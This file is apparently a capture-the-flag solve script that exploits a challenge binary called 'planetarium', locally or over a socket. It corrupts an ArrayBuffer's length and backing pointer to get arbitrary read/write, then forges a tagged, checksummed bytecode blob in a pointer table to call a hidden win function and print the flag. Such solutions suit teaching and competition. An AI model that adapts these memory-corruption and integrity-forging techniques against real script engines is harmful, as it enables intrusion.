#!/usr/bin/env python3
import struct
import subprocess
import socket
import sys

ARENA_SIZE = 0x20000
ARRAYBUFFER_MAP = 0x414255465F4D4150
ISOLATE_MAGIC = 0x49534F4C41544550
TPT_MAGIC = 0x5450545F53544152
BYTECODE_MAGIC = 0x56384243
BYTECODE_HEADER_SIZE = 0x18
TPT_HEADER_SIZE = 0x20
TPT_ENTRY_SIZE = 0x18
NATIVE_WIN = 0x1337
WIN_TOKEN = 0x524154535F4F5242


class ProcessTube:
    def __init__(self, argv):
        self.p = subprocess.Popen(
            argv,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=False,
            bufsize=0,
        )
        self.recv_until(b"> ")

    def recv_until(self, marker):
        data = b""
        while not data.endswith(marker):
            ch = self.p.stdout.read(1)
            if not ch:
                raise EOFError(data)
            data += ch
        return data

    def cmd(self, line):
        self.p.stdin.write(line.encode() + b"\n")
        self.p.stdin.flush()
        out = self.recv_until(b"> ")
        return out[:-2].strip()


class RemoteTube:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=10)
        self.recv_until(b"> ")

    def recv_until(self, marker):
        data = b""
        while not data.endswith(marker):
            chunk = self.s.recv(1)
            if not chunk:
                raise EOFError(data)
            data += chunk
        return data

    def cmd(self, line):
        self.s.sendall(line.encode() + b"\n")
        out = self.recv_until(b"> ")
        return out[:-2].strip()


def rotl64(x, r):
    return ((x << r) | (x >> (64 - r))) & 0xFFFFFFFFFFFFFFFF


def splitmix64(x):
    x = (x + 0x9E3779B97F4A7C15) & 0xFFFFFFFFFFFFFFFF
    x = ((x ^ (x >> 30)) * 0xBF58476D1CE4E5B9) & 0xFFFFFFFFFFFFFFFF
    x = ((x ^ (x >> 27)) * 0x94D049BB133111EB) & 0xFFFFFFFFFFFFFFFF
    return (x ^ (x >> 31)) & 0xFFFFFFFFFFFFFFFF


def make_tag(cookie, off, length):
    mixed = (
        cookie
        ^ ((off & 0xFFFFFFFF) << 17)
        ^ ((length & 0xFFFFFFFF) << 41)
        ^ 0x76385F706C616E65
    ) & 0xFFFFFFFFFFFFFFFF
    return (rotl64(splitmix64(mixed), 23) ^ 0xA11CE5EED5EED123) & 0xFFFFFFFFFFFFFFFF


def checksum(read8, code_off, length, tag):
    h = (0x811C9DC5 ^ (tag & 0xFFFFFFFF)) & 0xFFFFFFFF
    for i in range(length):
        h ^= read8(code_off + i)
        h = (h * 0x01000193) & 0xFFFFFFFF
        h = ((h << 5) | (h >> 27)) & 0xFFFFFFFF
    return (h ^ (tag >> 32) ^ 0x44387621) & 0xFFFFFFFF


def u64(x):
    return struct.unpack("<Q", x)[0]


def p64(x):
    return struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)


def parse_hex(out):
    lines = [line for line in out.splitlines() if line.startswith(b"0x")]
    if not lines:
        raise ValueError(out)
    return int(lines[-1], 16)


def main():
    if len(sys.argv) >= 2 and sys.argv[1] == "--remote":
        if len(sys.argv) != 4:
            raise SystemExit("usage: solve.py --remote HOST PORT")
        io = RemoteTube(sys.argv[2], int(sys.argv[3]))
    else:
        argv = sys.argv[1:] if len(sys.argv) >= 2 else ["./planetarium"]
        io = ProcessTube(argv)

    io.cmd("m.new m 8")
    for i in range(5):
        io.cmd(f"m.set m k{i} = {i + 1}")
    io.cmd("m.set m @@hole = 0x4141")
    io.cmd("m.del m @@hole")

    io.cmd("a.new victim 8")
    io.cmd("b.new buf 0x100")
    io.cmd("fn.new runme")
    io.cmd("o.new fast m victim")

    buf_index = None
    for idx in range(8, 80):
        value = parse_hex(io.cmd(f"o.read fast {idx}"))
        if value == ARRAYBUFFER_MAP:
            buf_index = idx
            break
    if buf_index is None:
        raise RuntimeError("ArrayBuffer header not found")

    byte_length_idx = buf_index + 3
    backing_idx = buf_index + 4
    io.cmd(f"o.write fast {byte_length_idx} 0x{ARENA_SIZE:x}")
    io.cmd(f"o.write fast {backing_idx} 0x0")

    def read64(off):
        return parse_hex(io.cmd(f"dv.read buf 0x{off:x}"))

    def write64(off, value):
        io.cmd(f"dv.write buf 0x{off:x} 0x{value & 0xFFFFFFFFFFFFFFFF:x}")

    def read8(off):
        return read64(off & ~7) >> ((off & 7) * 8) & 0xFF

    isolate = None
    tpt = None
    for off in range(0x1000, 0x3000, 8):
        value = read64(off)
        if value == ISOLATE_MAGIC:
            isolate = off
        if value == TPT_MAGIC:
            tpt = off
    if isolate is None or tpt is None:
        raise RuntimeError("failed to find isolate/TPT")

    cookie = read64(isolate + 0x08)
    tpt_from_isolate = read64(isolate + 0x10)
    if tpt_from_isolate != tpt:
        raise RuntimeError("TPT mismatch")

    fake_off = 0x18000
    code = bytearray()
    code += b"\x41" + p64(WIN_TOKEN ^ cookie)
    native_mask = ((cookie >> 13) ^ (cookie >> 29) ^ 0xA55A) & 0xFFFF
    code += b"\x52" + struct.pack("<H", NATIVE_WIN ^ native_mask)
    code += b"\xff"
    length = len(code)
    tag = make_tag(cookie, fake_off, length)

    write64(fake_off + 0x00, BYTECODE_MAGIC | (length << 32))
    write64(fake_off + 0x08, tag)
    write64(fake_off + 0x10, 0)
    for i in range(0, len(code), 8):
        write64(fake_off + BYTECODE_HEADER_SIZE + i, u64(code[i:i + 8].ljust(8, b"\x00")))
    csum = checksum(read8, fake_off + BYTECODE_HEADER_SIZE, length, tag)
    write64(fake_off + 0x10, csum)

    entry0 = tpt + TPT_HEADER_SIZE
    write64(entry0 + 0x00, fake_off | (length << 32))
    write64(entry0 + 0x08, tag)

    out = io.cmd("fn.call runme")
    sys.stdout.buffer.write(out + b"\n")
    if b"ITECHNO26{" not in out:
        raise RuntimeError("flag not printed")


if __name__ == "__main__":
    main()
